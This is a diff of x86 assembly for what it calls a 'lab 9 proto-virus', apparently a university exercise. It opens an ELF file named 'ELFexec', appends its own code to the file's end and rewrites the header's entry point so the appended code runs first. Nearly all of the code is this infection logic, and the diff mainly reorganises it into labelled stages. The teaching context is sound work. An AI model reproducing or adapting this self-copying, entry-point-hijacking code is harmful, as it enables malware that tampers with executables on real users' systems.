@@ -63,42 +63,41 @@ _start:
 	mov	ebp, esp
 	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage
 
-	; write 1, OutStr, 32					; print virus
-
-	call get_my_loc
-	sub ecx, next_i
-	add  ecx, OutStr
-	write 1, ecx, 32
-
+	.open_file:
     mov ebx, FileName           ; Set filename
     open ebx,RDWR, 0x777
     mov FD, eax					;save the file descriptor
     cmp FD, -1
     je FD_Error
 
+	.check_if_ELF:
     lea ecx, [ELF_header]
     read FD,ecx,52			;read 52 first byte (header size of ELF)
-
     cmp dword [ELF_header], 0x464C457F ; compare the first 4 bytes of the file to check if is ELF
     jne Not_Elf
 
 
-
+	.write_the_virus:
     lseek FD, 0 ,SEEK_END 				;set the file pointer to the end of the file
     mov FIleSize, eax
     call get_my_loc
 	sub ecx, next_i
-    add ecx, _start
-    mov edx , virus_end-_start
+    add ecx, _start.show_virus
+    mov edx , virus_end-_start.show_virus
     write FD,ecx,edx					;write the content of this script to the end of the file
 
+	.change_entry_point:
 	mov eax, 0x8048000					; ELF base address
 	add eax, FIleSize
 	mov dword [ELF_header+ENTRY], eax
 	lseek FD, 0, SEEK_SET 				
-
 	lea ecx, [ELF_header]				;store the memory offset
 	write FD,ecx,52						;write the modified header back to the file
+	
+	close FD
+	
+	.show_virus:
+	call print_virus
 
     call VirusExit
 	
@@ -117,7 +116,6 @@ FD_Error:
 
 
 VirusExit:
-       close FD
        exit 0               ; Termination if all is OK and no previous code to jump to
                             ; (also an example for use of above macros)
 	
@@ -125,7 +123,12 @@ FileName:	db "ELFexec", 0
 OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
 Failstr:    db "perhaps not", 10 , 0
 	
-
+print_virus:
+	call get_my_loc
+	sub ecx, next_i
+	add  ecx, OutStr
+	write 1, ecx, 32
+	ret
 get_my_loc:
 	call next_i
 next_i:
